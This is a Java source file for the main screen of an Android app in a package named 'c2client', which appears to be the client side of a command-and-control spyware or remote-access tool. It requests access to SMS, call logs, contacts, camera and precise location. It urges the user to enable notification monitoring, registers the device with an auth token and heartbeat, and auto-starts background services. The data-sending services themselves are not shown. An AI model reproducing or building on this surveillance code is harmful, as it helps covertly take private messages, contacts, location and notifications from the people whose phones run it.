package com.astra.c2client;

import android.Manifest;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.provider.Settings;
import android.util.Log;
import android.view.View;
import android.widget.Button;
import android.widget.ScrollView;
import android.widget.TextView;
import android.widget.Toast;

import androidx.annotation.NonNull;
import androidx.appcompat.app.AlertDialog;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.List;
import java.util.Locale;

public class MainActivity extends AppCompatActivity {
    private static final String TAG = "AstraC2-Main";
    private static final int PERMISSION_REQUEST_CODE = 123;
    
    private TextView statusTextView;
    private TextView logTextView;
    private ScrollView logScrollView;
    private Button startButton;
    private Button stopButton;
    
    private Handler mainHandler;
    private SharedPreferences sharedPreferences;
    
    private boolean servicesRunning = false;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        
        // Initialize UI components
        statusTextView = findViewById(R.id.statusTextView);
        logTextView = findViewById(R.id.logTextView);
        logScrollView = findViewById(R.id.logScrollView);
        startButton = findViewById(R.id.startButton);
        stopButton = findViewById(R.id.stopButton);
        
        mainHandler = new Handler(Looper.getMainLooper());
        sharedPreferences = getSharedPreferences(Config.PREFS_NAME, MODE_PRIVATE);
        
        // Setup button event handlers
        startButton.setOnClickListener(view -> startServices());
        stopButton.setOnClickListener(view -> stopServices());
        
        // Check if the device is already registered
        updateUIFromPreferences();
        
        // Request required permissions
        requestRequiredPermissions();
        
        // Auto-start services if they were running before
        if (sharedPreferences.getBoolean(Config.PREF_SERVICES_RUNNING, false)) {
            startServices();
        }

        // Check for notification access
        if (!isNotificationListenerEnabled()) {
            promptNotificationAccess();
        }
    }

    @Override
    protected void onResume() {
        super.onResume();
        updateUIFromPreferences();
    }
    
    private void updateUIFromPreferences() {
        boolean deviceRegistered = sharedPreferences.contains(Config.PREF_DEVICE_ID) && 
                                  sharedPreferences.contains(Config.PREF_AUTH_TOKEN);
        
        String deviceId = sharedPreferences.getString(Config.PREF_DEVICE_ID, "Not registered");
        String lastHeartbeat = sharedPreferences.getString(Config.PREF_LAST_HEARTBEAT, "Never");
        boolean running = sharedPreferences.getBoolean(Config.PREF_SERVICES_RUNNING, false);
        
        servicesRunning = running;
        
        StringBuilder statusBuilder = new StringBuilder();
        statusBuilder.append("Status: ").append(running ? "Running" : "Stopped").append("\n");
        statusBuilder.append("Device ID: ").append(deviceId).append("\n");
        statusBuilder.append("Last Heartbeat: ").append(lastHeartbeat).append("\n");
        
        statusTextView.setText(statusBuilder.toString());
        
        // Enable/disable buttons based on state
        startButton.setEnabled(!running);
        stopButton.setEnabled(running);
        
        // Add to log
        if (deviceRegistered && !running) {
            appendToLog("Device registered but services not running");
        } else if (!deviceRegistered) {
            appendToLog("Device not registered. Starting registration service.");
        }
    }
    
    private void startServices() {
        appendToLog("Starting services...");
        
        // Initialize if not registered
        if (!sharedPreferences.contains(Config.PREF_DEVICE_ID)) {
            // Start registration service
            Intent registerIntent = new Intent(this, DeviceRegisterService.class);
            startService(registerIntent);
            appendToLog("Starting device registration service");
        } else {
            // Start the service manager
            ServiceManager.startAllServices(this);
            
            // Save the state
            sharedPreferences.edit().putBoolean(Config.PREF_SERVICES_RUNNING, true).apply();
            servicesRunning = true;
            
            appendToLog("All services started");
            updateUIFromPreferences();
        }
    }
    
    private void stopServices() {
        appendToLog("Stopping services...");
        
        // Stop all services
        ServiceManager.stopAllServices(this);
        
        // Save the state
        sharedPreferences.edit().putBoolean(Config.PREF_SERVICES_RUNNING, false).apply();
        servicesRunning = false;
        
        appendToLog("All services stopped");
        updateUIFromPreferences();
    }
    
    public void appendToLog(final String message) {
        mainHandler.post(() -> {
            String timestamp = new SimpleDateFormat("HH:mm:ss", Locale.getDefault()).format(new Date());
            logTextView.append(timestamp + ": " + message + "\n");
            
            // Auto-scroll to bottom
            logScrollView.post(() -> logScrollView.fullScroll(View.FOCUS_DOWN));
        });
    }
    
    private void requestRequiredPermissions() {
        List<String> permissionsNeeded = new ArrayList<>();
        
        // Check for required permissions
        String[] permissions = {
            Manifest.permission.INTERNET,
            Manifest.permission.ACCESS_NETWORK_STATE,
            Manifest.permission.ACCESS_FINE_LOCATION,
            Manifest.permission.ACCESS_COARSE_LOCATION,
            Manifest.permission.READ_PHONE_STATE,
            Manifest.permission.READ_CONTACTS,
            Manifest.permission.READ_CALL_LOG,
            Manifest.permission.READ_SMS,
            Manifest.permission.CAMERA
        };
        
        for (String permission : permissions) {
            if (ContextCompat.checkSelfPermission(this, permission) != PackageManager.PERMISSION_GRANTED) {
                permissionsNeeded.add(permission);
            }
        }
        
        // Request any permissions that are not granted
        if (!permissionsNeeded.isEmpty()) {
            ActivityCompat.requestPermissions(
                this,
                permissionsNeeded.toArray(new String[0]),
                PERMISSION_REQUEST_CODE
            );
        }
    }
    
    @Override
    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        
        if (requestCode == PERMISSION_REQUEST_CODE) {
            boolean allGranted = true;
            
            for (int result : grantResults) {
                if (result != PackageManager.PERMISSION_GRANTED) {
                    allGranted = false;
                    break;
                }
            }
            
            if (allGranted) {
                appendToLog("All permissions granted");
            } else {
                appendToLog("Some permissions were denied. Functionality may be limited.");
                Toast.makeText(this, "Some permissions are required for full functionality", Toast.LENGTH_LONG).show();
            }
        }
    }
    
    private boolean isNotificationListenerEnabled() {
        String packageName = getPackageName();
        String flat = Settings.Secure.getString(getContentResolver(), "enabled_notification_listeners");
        return flat != null && flat.contains(packageName);
    }
    
    private void promptNotificationAccess() {
        new AlertDialog.Builder(this)
            .setTitle("Notification Access Required")
            .setMessage("This app needs notification access to monitor device notifications. Please enable it in the following settings page.")
            .setPositiveButton("Go to Settings", (dialog, which) -> {
                Intent intent = new Intent("android.settings.ACTION_NOTIFICATION_LISTENER_SETTINGS");
                startActivity(intent);
            })
            .setNegativeButton("Later", null)
            .show();
    }
}
